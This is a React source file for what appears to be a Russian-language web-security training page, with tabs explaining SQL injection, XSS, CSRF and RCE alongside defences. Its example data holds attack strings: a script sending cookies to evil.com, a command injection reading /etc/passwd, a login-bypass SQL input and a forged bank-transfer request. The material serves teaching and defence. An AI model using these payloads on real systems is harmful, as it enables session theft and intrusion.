import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Database,
  Globe,
  ShieldAlert,
  Terminal,
  BookOpen,
  ShieldCheck,
  AlertTriangle
} from 'lucide-react';

import AppLayout from '../../components/layout/AppLayout';
import './TheoryPage.css';

function TheoryPage() {
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState('sql');

  const content = {
    sql: {
      title: 'SQL Injection (SQLi)',
      icon: <Database size={24} />,
      color: 'blue',
      definition:
        'Тип уязвимости, при котором атакующий может внедрить вредоносный SQL-код в запросы к базе данных приложения.',
      mechanism:
        'Возникает, когда данные, полученные от пользователя, подставляются в SQL-запрос без должной обработки или экранирования. Это позволяет атакующему изменить логику запроса.',
      example: {
        code: "SELECT * FROM users WHERE username = '$username' AND password = '$password';",
        attack: "admin' --",
        result:
          "SELECT * FROM users WHERE username = 'admin' --' AND password = '...';"
      },
      protection: [
        'Использование подготовленных выражений (Prepared Statements)',
        'Использование ORM (Object-Relational Mapping)',
        'Строгая валидация и типизация входных данных',
        'Принцип наименьших привилегий для пользователя БД'
      ]
    },

    xss: {
      title: 'Cross-Site Scripting (XSS)',
      icon: <Globe size={24} />,
      color: 'emerald',
      definition:
        'Уязвимость, позволяющая внедрить вредоносный JavaScript-код на веб-страницу, который будет выполнен в браузере других пользователей.',
      mechanism:
        'Атакующий внедряет скрипт через формы ввода, URL-параметры или заголовки. Когда жертва открывает страницу, скрипт выполняется в контексте её сессии.',
      example: {
        code: '<div>Привет, {username}!</div>',
        attack:
          "<script>fetch('http://evil.com?cookie=' + document.cookie)</script>",
        result:
          'Скрипт выполняется и отправляет куки пользователя злоумышленнику.'
      },
      protection: [
        'Экранирование всех данных при выводе в HTML',
        'Использование Content Security Policy (CSP)',
        'Флаг HttpOnly для сессионных кук',
        'Санитизация HTML-ввода'
      ]
    },

    csrf: {
      title: 'Cross-Site Request Forgery (CSRF)',
      icon: <ShieldAlert size={24} />,
      color: 'amber',
      definition:
        'Атака, при которой злоумышленник заставляет браузер жертвы выполнить нежелательное действие на доверенном сайте, где жертва авторизована.',
      mechanism:
        'Использует тот факт, что браузеры автоматически отправляют куки (включая сессионные) при запросах к домену, даже если запрос инициирован со стороннего сайта.',
      example: {
        code:
          "<img src='http://bank.com/transfer?to=attacker&amount=1000' />",
        attack:
          'Жертва заходит на сайт атакующего, и браузер скрыто выполняет запрос к банку.',
        result: 'Деньги переводятся без ведома пользователя.'
      },
      protection: [
        'Использование CSRF-токенов',
        'Проверка заголовка Referer/Origin',
        'SameSite атрибут для кук',
        'Повторная аутентификация для критических действий'
      ]
    },

    rce: {
      title: 'Remote Code Execution (RCE)',
      icon: <Terminal size={24} />,
      color: 'red',
      definition:
        'Критическая уязвимость, позволяющая атакующему удаленно выполнять произвольный код на сервере.',
      mechanism:
        'Часто возникает из-за небезопасной десериализации, инъекции команд ОС или уязвимостей в загрузке файлов.',
      example: {
        code: "system('ping ' + $_GET['ip']);",
        attack: '127.0.0.1; cat /etc/passwd',
        result:
          'Сервер выполняет ping, а затем выводит содержимое файла паролей.'
      },
      protection: [
        'Никогда не выполнять команды ОС с пользовательским вводом',
        'Использовать безопасные API',
        'Минимальные привилегии сервисов',
        'Изоляция приложений (контейнеризация)'
      ]
    }
  };

  const activeContent = content[activeTab];

  return (
    <AppLayout>
      {/* HEADER */}
      <div className="theory-header">
        <div className="header-icon">
          <BookOpen size={32} />
        </div>
        <div>
          <h1 className="theory-title">Теория уязвимостей</h1>
          <p className="theory-subtitle">
            Изучите механизмы работы основных веб-уязвимостей и методы защиты
          </p>
        </div>
      </div>

      {/* TABS */}
      <div className="theory-tabs">
        {Object.keys(content).map(key => (
          <button
            key={key}
            onClick={() => setActiveTab(key)}
            className={`theory-tab ${
              activeTab === key ? 'active' : ''
            }`}
          >
            <span className="tab-icon">{content[key].icon}</span>
            {key.toUpperCase()}
          </button>
        ))}
      </div>

      {/* CONTENT */}
      <div className="theory-content">
        <div className="content-main">
          <div className={`content-card content-${activeContent.color}`}>
            <div className="content-header">
              <div className="content-icon">{activeContent.icon}</div>
              <h2>{activeContent.title}</h2>
            </div>

            <div className="content-section">
              <h3>Что это такое?</h3>
              <p>{activeContent.definition}</p>
            </div>

            <div className="content-section">
              <h3>Как это работает?</h3>
              <p>{activeContent.mechanism}</p>
            </div>
          </div>

          <div className="example-card">
            <div className="example-header">
              <AlertTriangle size={20} />
              <h3>Пример атаки</h3>
            </div>

            <div className="code-block">
              <div className="code-label">// Уязвимый код</div>
              <code>{activeContent.example.code}</code>
            </div>

            <div className="code-block">
              <div className="code-label">// Ввод атакующего</div>
              <code className="code-attack">
                {activeContent.example.attack}
              </code>
            </div>

            <div className="code-block">
              <div className="code-label">// Результат</div>
              <code className="code-result">
                {activeContent.example.result}
              </code>
            </div>
          </div>
        </div>

        {/* SIDEBAR CONTENT */}
        <aside className="content-sidebar">
          <div className="protection-card">
            <div className="protection-header">
              <ShieldCheck size={24} />
              <h3>Как защититься</h3>
            </div>

            <ul className="protection-list">
              {activeContent.protection.map((item, index) => (
                <li key={index}>
                  <span className="bullet" />
                  {item}
                </li>
              ))}
            </ul>
          </div>

          <div className="cta-card">
            <h3>Готовы к практике?</h3>
            <p>Попробуйте найти эту уязвимость в безопасной среде.</p>
            <button
              className="cta-button"
              onClick={() =>
                navigate(`/exercises/${activeTab}`)
              }
            >
              Перейти к упражнениям
            </button>
          </div>
        </aside>
      </div>
    </AppLayout>
  );
}

export default TheoryPage;
